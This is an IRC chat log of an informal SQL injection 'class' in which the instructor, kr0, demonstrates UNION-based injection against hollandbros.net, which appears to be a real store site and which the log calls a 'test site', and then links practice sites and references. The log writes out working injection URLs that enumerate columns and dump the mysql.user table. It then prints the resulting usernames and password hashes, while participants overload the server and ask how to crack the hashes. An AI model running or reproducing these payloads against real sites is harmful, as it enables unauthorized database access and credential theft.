<~kr0> Show_db_priv
<~kr0> Super_priv
<~kr0> Create_tmp_table_priv
<~kr0> Lock_tables_priv
<~kr0> Execute_priv
<~kr0> Repl_slave_p
<~kr0> This is what it will give you 
<~kr0> quick question
<~kr0> qhat columns should we drop ?
< Drikizdas> host
< Drikizdas> ?
<~kr0> meh
< webanon> super
< Gonefor> well if anybody want to crank up server then post it here...everyody will traffic it soo much to give  it error :-p
< g0s5> password
<~kr0> not that Important
< MagicCookie> password
<~kr0> thats a good one 
< Freenaught008> back up
<~kr0> password
< g0s5> ^^
< DaYs> user?
<~kr0> and what do we need as well
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28column_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x75736572%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,15
<~kr0> This ^
<~kr0> we're at this
<~kr0> exactly
<~kr0> User and password
< omegacolon> is there a hex converter we can find online.. or..
<~kr0> yes
< greywasp> omegacolon: google :P
<~kr0> they're everywhere 
<~kr0> (SELECT+GROUP_CONCAT(User,0x3a,Password+SEPARATOR+0x3c62723e)+FROM+mysql.user)
< omegacolon> ok just wonderin'
< g0s5> still getting: 500 - Internal Server Error anyone else?
<~kr0> now we use this to pull them
< greywasp> yes -.-
< webanon> yeah that site is canned
<~kr0> I'll post every result 
<&mona> someone's benchmarking
<~kr0> so
< g0s5> nice THX
<~kr0> yea
< kashloca> yeah the load on the server 
<~kr0> (SELECT+GROUP_CONCAT(User,0x3a,Password+SEPARATOR+0x3c62723e)+FROM+mysql.user)
<~kr0> this
<~kr0> This grabs the Input of the column "user" and "password" and drops it 
<~kr0> from database : mysql and table : user
<~kr0> the 0x3a is hexed 
<~kr0> and means :
<~kr0> so the Url follows
< omegacolon> k
< MagicCookie> ...
<~kr0> http://hollandbros.net/store.php?id=null UNION SELECT 1,(SELECT+GROUP_CONCAT(User,0x3a,Password+SEPARATOR+0x3c62723e)+FROM+mysql.user),3,4,5,6,7,8,9,10,11,12,13,14,15
< MagicCookie> thanks
< webanon> but why keep sklipping column 2
< MagicCookie> thats the one that is injected
<~kr0> This should give you all thes hashed paswords and users in the Database mysql and table user
<~kr0> webanon, doesn't really matter 
< webanon> oh ok the select is for column 2
<~kr0> we could've injected in any column which is echo back data
< Devilboy> 500 - Internal Server Error
< g0s5> same same
< MagicCookie> same here
< kashloca> same here
< Drikizdas> same
< Gonefor> hmm...guys
< g0s5> killed it for now
<~kr0> we're just using that column to inject data 
<~kr0> nothing else
< Gonefor> can we change the class timing??
< MagicCookie> RIP
<~kr0> Its just our Gateeway , so to say
<~kr0> I'll skip that
<~kr0> Give you my Notes 
< kashloca> now it works
< Devilboy> its a XSS so your web browser cannot open. lol :P
< omegacolon> thanks for the class!
< Gonefor> guys .....can we change the class timing??
< MagicCookie> reload as xss
<~kr0> yroot:6191797264869e17
<~kr0> yscr_pmalPq-:2d7b5c1f57315313
<~kr0> yscr_pmarsKX:17b3266c41a3158d
<~kr0> hollandbros2:114f0c96508c34a4
<~kr0> this is the output 
< omegacolon> username and password.
< DaYs> great tut
< omegacolon> but the password is hashed.
<~kr0> user:password
< Devilboy> nice
< Devilboy> thnx
<~kr0> okay guys
< omegacolon> can I enter the hashed password to even login?
< Atom_> super
< Atom_> no
< webanon> is that base64 passwords?
<~kr0> Hope you learned a bit
< webanon> yes
< omegacolon> Yep.. immensly.
< Drikizdas> what's the use of the pass if it's hashed?/
< webanon> learned a lot
< omegacolon> Just need to learn more SQL syntaxes.
< Gonefor> somewhat that we need to learn sql
< Devilboy> i learned a lot for my first time
<~kr0> okay 
< drzupan> but.. if pass is in sha-1?
< FreeDom> thanks kr0
< Miker0soft> very clear thanks!
<~kr0> normally these classes aren't that long 
< g0s5> how do i find out how passwords are hased?
< g0s5> hashed?
< webanon> dont lie devil u the one that brought down our test site
< Gonefor> what to do of hashed password??
< omegacolon> he just pasted it
< g0s5> md5 ....etc?
<~kr0> normally they are obvious long
< omegacolon> hollandbros2:114f0c96508c34a4
<~kr0> okay
< omegacolon> user:password 
< omegacolon> so yes, it's hashed.. because it's obvious.
<~kr0> CLASS DISMISSED
< webanon> ok so a md5 has decryption is needed
< drzupan> will the link piratepad logged?
<~kr0> I'll give you guys a bit top read
< omegacolon> ir just inject the hashes password.
<~kr0> one sec
< webanon> kro can u guys start a qna for after class
<~kr0> Other Training Sites : 
<~kr0> http://54.149.82.150/
<~kr0> http://54.186.248.116/
<~kr0> http://54.200.178.220/
<~kr0> http://54.213.131.105/
< webanon> me and winning testing and defintly at a lost and could of used one
<~kr0> these are fake websites with Web App vulns on them 
<~kr0> check that out
<~kr0> 1 sec I'll give you my notes
<~kr0> okay
<~kr0> https://ghostbin.com/paste/43zum/raw
< joinjohn> yeah
<~kr0> https://ghostbin.com/paste/43zum/raw
<~kr0> https://ghostbin.com/paste/43zum/raw
<~kr0> https://ghostbin.com/paste/43zum/raw
<~kr0> https://ghostbin.com/paste/43zum/raw
<~kr0> https://ghostbin.com/paste/43zum/raw
<~kr0> https://ghostbin.com/paste/43zum/raw
<~kr0> my notes 
< joinjohn> kr0 what is this?
< g0s5> merciiii
< joinjohn> you notes?
< omegacolon> with the ip address like http://54.149.82.150/ how to do I inject SQLi properly?
< joinjohn> haha
< omegacolon> php and id - I get it
<~kr0> http://www.w3schools.com/sql/
<~kr0> how to SQL ^
<~kr0> how to SQL ^
<~kr0> how to SQL ^
<~kr0> http://www.w3schools.com/sql/
<~kr0> http://www.w3schools.com/sql/
<~kr0> http://www.w3schools.com/sql/
<~kr0> http://www.w3schools.com/sql/
<~kr0> http://www.w3schools.com/sql/
< omegacolon no.., that's not what I meant.
< webanon> i did a search for 1 and that brindgs up a search=1
<~kr0> I know
< joinjohn> stop flood
< joinjohn> kidding
< joinjohn> kr0 you old?
<~kr0> for example : http://54.149.82.150/bookdetail.aspx?id=1
< webanon> http://54.213.131.105/Searchresult.aspx?ScriptName=1
<~kr0> but , this site is MsSql
< joinjohn> sql injection kr0?
< joinjohn> lol
< joinjohn> okay go sql injection!
<~kr0> https://www.acunetix.com/websitesecurity/sql-injection2/
<~kr0> https://www.acunetix.com/websitesecurity/sql-injection2/
<~kr0> https://www.acunetix.com/websitesecurity/sql-injection2/
<~kr0> https://www.acunetix.com/websitesecurity/sql-injection2/
<~kr0> types of sql Injection
< fsociety> thx for everything kr0
< joinjohn> okidoki
< fsociety> rest your fingers
< webanon> Thank you Kr0
< Atom_> Forbidden
< Atom_> You don't have permission to access /websitesecurity/sql-injection2/ on this server.
<~kr0> https://www.youtube.com/watch?v=3IcYRL249Kw
<~kr0> https://www.youtube.com/watch?v=3IcYRL249Kw
<~kr0> https://www.youtube.com/watch?v=3IcYRL249Kw
<~kr0> https://www.youtube.com/watch?v=3IcYRL249Kw
< Gonefor> yeah
< joinjohn> kr0 what this site?
< joinjohn> hollandbros?
<~kr0> test sites
<~kr0> yea
< joinjohn> test sites?
< joinjohn> good
< joinjohn> )
< joinjohn> nice 
<~kr0> Web App Security For Mere Mortals 
<~kr0> awesome talk
< joinjohn> you lessons it's cool
<~kr0> and : https://www.youtube.com/watch?v=WkHkryIoLD0
<~kr0> and : https://www.youtube.com/watch?v=WkHkryIoLD0
<~kr0> and : https://www.youtube.com/watch?v=WkHkryIoLD0
<~kr0> and : https://www.youtube.com/watch?v=WkHkryIoLD0
< joinjohn> nice lessons
<~kr0> Joe McCray - Advanced SQL Injection - LayerOne 2009
<~kr0> take that
<~kr0> bookmark all of that
<~kr0> and learn as much as possible
< DaYs> tks
< omegacolon> thanks
< Atom_> thanks
< MagicCookie> kr0, I sent you a private message
< webanon> http://54.149.82.150/bookdetail.aspx?id=1%20order%20by%209
< joinjohn> I understand to sql injection, XSS attacks but much harder
< joinjohn> kr0
< kashloca> thanks kr0
< kashloca> thank u verymuch
 * kr0 bows
< webanon> applause
<~kr0> I hope you enjoyed it a bit
< kashloca> of course
< webanon> yes again ty for sharing your thoeries
< joinjohn> kr0 add me to friends
< Atom_> and also learned a lot.
<~kr0> joinjohn, this is not facebook
<~kr0> :>
< joinjohn> lol)
<~kr0> mona, you can stop logging now
< joinjohn> okay man
< Parabole> thanks kr0 ! Great teacher 
<~kr0> MagicCookie, just ask in here 
< joinjohn> great!
<~kr0> Its a huge Topic I know
< webanon> yeah where do get logs
< Gonefor> thnks
<~kr0> but these are the basics
< SR-100> thx kr0

REFERNCES: 
kr0's notes : https://ghostbin.com/paste/43zum/raw 
Learn SQL : https://www.w3schools.com/sql/ 
Different types of SQL Injection : https://www.acunetix.com/websitesecurity/sql-injection2/ 
Web App for mere mortals (Awesome Beginner Guide) : https://www.youtube.com/watch?v=3IcYRL249Kw 
Advanced SQL Injection : https://www.youtube.com/watch?v=WkHkryIoLD0
NETSEC: https://nets.ec/SQL_injection
